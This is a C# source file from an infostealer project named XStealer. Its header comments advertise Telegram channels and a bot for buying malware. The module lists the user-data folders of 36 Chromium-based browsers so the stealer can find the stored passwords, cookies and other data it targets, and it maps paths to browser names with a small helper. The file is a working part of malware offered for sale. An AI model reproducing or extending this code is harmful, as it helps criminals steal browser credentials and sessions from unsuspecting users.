// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System.Collections.Generic;
    using System.Linq;

    public static class CBrowserPaths
    {
        #region Chromium-based browser paths and names | Пути и имена браузеров на движке Chromium

        private static readonly KeyValuePair<string, string>[] List = new KeyValuePair<string, string>[]
        {
            new KeyValuePair<string, string>("Chrome", "Google Chrome"),
            new KeyValuePair<string, string>("Opera Stable", "Opera Stable"),
           // new KeyValuePair<string, string>("GX", "Opera GX"),
            new KeyValuePair<string, string>("Opera" , "Opera"),
            new KeyValuePair<string, string>("Neon" , "Opera Neon"),
            new KeyValuePair<string, string>("Citrio" , "Citrio"),
            new KeyValuePair<string, string>("MapleStudio" , "CoolNovo"),
            new KeyValuePair<string, string>("Avant Profiles" , "Avant Webkit"),
            new KeyValuePair<string, string>("Iridium" , "Iridium"),
            new KeyValuePair<string, string>("Yandex" , "Yandex"),
            new KeyValuePair<string, string>("Orbitum" , "Orbitum"),
            new KeyValuePair<string, string>("Kinza" , "Kinza"),
            new KeyValuePair<string, string>("Brave-Browser" , "Brave"),
            new KeyValuePair<string, string>("Amigo" , "Amigo"),
            new KeyValuePair<string, string>("Torch" , "Torch"),
            new KeyValuePair<string, string>("Comodo" , "Comodo Dragon"),
            new KeyValuePair<string, string>("Kometa" , "Kometa"),
            new KeyValuePair<string, string>("Vivaldi" , "Vivaldi"),
            new KeyValuePair<string, string>("Nichrome" , "Nichrome Rambler"),
            new KeyValuePair<string, string>("Epic" , "Epic Privacy"),
            new KeyValuePair<string, string>("CocCoc" , "CocCoc"),
            new KeyValuePair<string, string>("360Browser" , "360Browser"),
            new KeyValuePair<string, string>("Sputnik" , "Sputnik"),
            new KeyValuePair<string, string>("Uran" , "Uran"),
            new KeyValuePair<string, string>("CentBrowser" , "CentBrowser"),
            new KeyValuePair<string, string>("7Star" , "7Star"),
            new KeyValuePair<string, string>("Elements" , "Elements"),
            new KeyValuePair<string, string>("Superbird" , "Superbird"),
            new KeyValuePair<string, string>("Chedot" , "Chedot"),
            new KeyValuePair<string, string>("Suhba" , "Suhba"),
            new KeyValuePair<string, string>("Mustang" , "Mustang"),
            new KeyValuePair<string, string>("Edge" , "Edge"),
        };
        public static string[] ChromiumPaths { get; } = new string[36]
        {
            @"\Chromium\User Data\",
            @"\Google\Chrome\User Data\",
           // @"\Opera Software\Opera GX Stable\",
            @"\Google(x86)\Chrome\User Data\",
            @"\Opera Software\",
            @"\MapleStudio\ChromePlus\User Data\",
            @"\Iridium\User Data\",
            @"\7Star\7Star\User Data\",
            @"\CentBrowser\User Data\",
            @"\Chedot\User Data\",
            @"\Vivaldi\User Data\",
            @"\Kometa\User Data\",
            @"\Elements Browser\User Data\",
            @"\Epic Privacy Browser\User Data\",
            @"\Microsoft\Edge\User Data\",
            @"\uCozMedia\Uran\User Data\",
            @"\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\",
            @"\CatalinaGroup\Citrio\User Data\",
            @"\Coowon\Coowon\User Data\",
            @"\liebao\User Data\",
            @"\QIP Surf\User Data\",
            @"\Orbitum\User Data\",
            @"\Comodo\Dragon\User Data\",
            @"\Amigo\User\User Data\",
            @"\Torch\User Data\",
            @"\Yandex\YandexBrowser\User Data\",
            @"\Comodo\User Data\",
            @"\360Browser\Browser\User Data\",
            @"\Maxthon3\User Data\",
            @"\K-Melon\User Data\",
            @"\Sputnik\Sputnik\User Data\",
            @"\Nichrome\User Data\",
            @"\CocCoc\Browser\User Data\",
            @"\Uran\User Data\",
            @"\Chromodo\User Data\",
            @"\Mail.Ru\Atom\User Data\",
            @"\BraveSoftware\Brave-Browser\User Data\"
        };

        public static string GetName(string path)
        {
            try
            {
                foreach (KeyValuePair<string, string> v in List.Where(v => path.Contains(v.Key)).Select(v => v))
                {
                    return v.Value;
                }
            }
            catch { }
            return path ?? path.Split('\\')[1];
        }

        #endregion
    }
}